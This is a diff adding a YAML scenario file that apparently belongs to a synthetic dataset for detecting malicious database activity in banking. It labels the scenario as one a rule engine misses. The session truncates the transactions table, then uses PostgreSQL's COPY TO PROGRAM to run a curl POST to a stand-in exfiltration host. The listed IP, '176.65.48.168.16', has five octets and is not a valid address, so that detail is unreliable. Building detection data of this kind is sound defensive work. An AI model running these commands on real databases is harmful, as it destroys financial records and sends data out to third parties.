@@ -1,0 +1,23 @@
+scenario_id: gen_banking_48_data_tamper_mal_1252
+family_id: gen_banking_48_data_tamper_mal_fam1252
+domain: banking
+time_of_day: 01:20
+default_class: malicious
+rule_engine_relationship: malicious_false_negative
+sessions:
+- session_label: tamper
+  role: postgres
+  anchor: db
+  timing:
+    tempo: bursty
+    step_gaps_seconds:
+    - 1.0
+  events:
+  - step_id: act
+    sql: TRUNCATE TABLE transactions
+  - step_id: dump
+    sql: COPY (SELECT 1) TO PROGRAM 'curl -sX POST https://analytics-mirror.datasink.example/ingest
+      -d @-'
+    connects_to:
+      ip: 176.65.48.168.16
+      port: 443
